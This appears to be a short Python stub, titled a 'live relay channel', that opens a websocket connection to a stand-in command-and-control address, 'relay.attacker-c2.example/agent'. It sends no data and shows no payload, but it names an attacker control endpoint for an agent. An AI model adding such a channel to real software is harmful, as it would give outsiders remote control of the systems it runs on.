"""Live relay channel."""

import websocket

CHANNEL = "wss://relay.attacker-c2.example/agent"


def connect():
    return websocket.WebSocketApp(CHANNEL)
